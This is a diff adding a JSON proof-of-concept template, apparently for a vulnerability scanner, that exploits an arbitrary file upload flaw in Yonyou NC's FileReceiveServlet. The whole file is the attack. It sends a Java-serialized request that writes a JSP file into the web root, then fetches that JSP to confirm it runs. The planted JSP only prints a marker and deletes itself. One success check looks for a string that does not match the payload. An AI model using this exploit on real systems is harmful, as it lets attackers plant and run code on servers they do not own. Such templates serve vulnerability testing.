@@ -1,0 +1,56 @@
+{
+    "Name": "用友NCarbitrary-file-upload",
+    "Description": "用友NCarbitrary-file-upload",
+    "Product": "用友",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Content-Type":"multipart/form-data;"},
+        "Uri":"/servlet/FileReceiveServlet",
+        "Port":"",
+        "Data":"\\xac\\xed\\x00\\x05sr\\x00\\x11java.util.HashMap\\x05\\a\\xda\\xc1\\xc3\\x16`\\xd1\\x03\\x00\\x02F\\x00\nloadFactorI\\x00\tthresholdxp?@\\x00\\x00\\x00\\x00\\x00\fw\b\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x02t\\x00\tFILE_NAMEt\\x00\tchumengchumeng.jspt\\x00\\x10TARGET_FILE_PATHt\\x00\\x10./webapps/nc_webx<%out.print(\"chumeng12123\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "renyizifumofamen"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":"AND"
+                },{
+                    "Method": "GET",
+                    "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+                    "Uri":"/chumengchumeng.jsp",
+                    "Port":"",
+                    "Data":"",
+                    "Follow_redirects":"false",
+                    "Upload":{"Name": "","fileName": "","filePath": "" },
+                    "Response":{
+                    "Check_Steps":"AND",
+                    "Checks": [
+                            {
+                            "Operation": "contains", 
+                            "Key":"",
+                            "Value": "chumeng12123"
+                            },
+                             {
+                            "Operation": "code", 
+                            "Key":"",
+                            "Value": "200"  
+                             }
+                    ]
+                    },
+                    "Next_decide":""
+                            }
+]}
